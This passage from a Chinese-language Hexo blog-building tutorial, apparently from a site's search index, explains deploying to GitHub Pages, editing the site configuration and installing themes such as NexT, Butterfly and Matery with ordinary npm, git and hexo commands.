class="highlight java"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git<span class="meta">@github</span>.com:用户名/用户名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>这块在动配置文件的时候，需要主要变量和值之前是要用空格来进行分隔的。</p><p>如 “type:git”，会报错；但使用”type: git”，不会报错。</p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>输入如下命令，安装部署插件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save # 安装部署插件</span><br></pre></td></tr></table></figure><p>若并进行上述操作，直接部署的时候，会报错。</p><h2 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h2><p>输入如下命令，将本地的文件+资源等上传到github</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><p>部署成功后，打开对应的网址  <a href="https://www.username.github.io/">https://www.username.github.io</a></p><p>如果出现了和本地预览一样的效果，那么，表明部署成功。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711823.png" alt="image-20240409171102708"> </p><h1 id="网站基本信息的修改"><a href="#网站基本信息的修改" class="headerlink" title="网站基本信息的修改"></a><strong>网站基本信息的修改</strong></h1><p>搭建好网站之后，有许多配置信息需要我们去修改，比如网站的标题、标签等选项，具体修改步骤如下：</p><p>打开博客目录下的_config.yml文件，找到如图所示的选项</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711765.png" alt="image-20240409171116734"> </p><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>title</td><td>网站的标题</td></tr><tr><td>subtitle</td><td>网站的副标题</td></tr><tr><td>description</td><td>对于网站的描述，主要用于SEO</td></tr><tr><td>keywords</td><td>网站的关键词，支持多个关键词</td></tr><tr><td>author</td><td>作者名</td></tr><tr><td>language</td><td>网站使用的语言，对于简体中文用户来说，语言的设置跟使用不同的主题有关，可以参考各自主题的文档自行配置，一般为zh-CN</td></tr><tr><td>timezone</td><td>设置网站的时区，如果不填则默认使用你电脑的时区</td></tr></tbody></table><p>ps：更多的配置信息修改可以去hexo的官方文档，<a href="https://hexo.io/zh-cn/docs/configuration.html">戳我跳转</a>，可以修改一个选项之后，执行hexo clean、hexo g、hexo s在本地看一下效果，等全部修改好之后再推送到仓库。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711978.png" alt="image-20240409171129884"> </p><h1 id="更换Hexo主题"><a href="#更换Hexo主题" class="headerlink" title="更换Hexo主题"></a>更换Hexo主题</h1><p>hexo默认的主题有点ugly，修改好基本配置信息之后，可以考虑换一个主题，主题多可以说的上是hexo框架的一大卖点，<a href="https://hexo.io/themes/">戳我去挑选主题</a>，界面如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711010.png" alt="image-20240409171137932"> </p><p>下面推荐几种看起来不错的主题：</p><h2 id="NexT"><a href="#NexT" class="headerlink" title="NexT"></a>NexT</h2><ul><li><a href="https://github.com/theme-next/hexo-theme-next">仓库地址</a></li><li><a href="https://theme-next.js.org/">预览地址</a></li><li>首先就是大名鼎鼎的Next主题了，页面简洁，功能全，用的人多，网上的个性化配置教程也超级多，用这个主题如果遇到问题，在网上基本上能找到对应的解决办法。</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711015.png" alt="image-20240409171147964"> </p><h2 id="Butterfly"><a href="#Butterfly" class="headerlink" title="Butterfly"></a>Butterfly</h2><ul><li><a href="https://github.com/jerryc127/hexo-theme-butterfly">仓库地址</a></li><li><a href="https://butterfly.js.org/">预览地址</a></li><li>挺好看的一个主题，用的人也挺多的：</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711188.png" alt="image-20240409171156067"> </p><h2 id="Nexmoe"><a href="#Nexmoe" class="headerlink" title="Nexmoe"></a>Nexmoe</h2><ul><li><a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe">仓库地址</a></li><li><a href="https://nexmoe.com/">预览地址</a>)</li><li>看起来不错~~</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091712812.png" alt="image-20240409171235695"> </p><h2 id="……"><a href="#……" class="headerlink" title="……"></a>……</h2><h2 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h2><p>这块个人比较喜欢的一款主题<strong>Metery</strong>，部署过程如下：</p><p>Hexo的所有主题源代码都是托管在Github的，更换主题第一步：<strong>将该主题的源代码clone下来，放到本地Hexo站点根目录下的<strong><strong>themes</strong></strong>文件夹中</strong>。</p><p>访问Metery主题的Github仓库,复制仓库地址：<a href="https://github.com/blinkfox/hexo-theme-matery">https://github.com/blinkfox/hexo-theme-matery</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091712700.png" alt="image-20240409171247643"> </p><p>然后在本地<strong>站点根目录</strong>打开git bash 命令行，进入themes文件夹，开始拉取代码到本地：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cd themes</span><br><span class="line">git clone https:<span class="comment">//github.com/blinkfox/hexo-theme-matery.git</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091712160.png" alt="image-20240409171256135"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091713557.png" alt="image-20240409171302526">  </p><p>更换主题</p><p>下载Hexo的主题到&#x2F;themes文件夹之后，要在<strong>站点配置文件</strong>中配置使用该主题：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">vim config.yml</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091713874.png" alt="image-20240409171309848">  </p><p>hexo一键三连后，查看效果</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091713074.png" alt="image-20240409171347929"> </p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
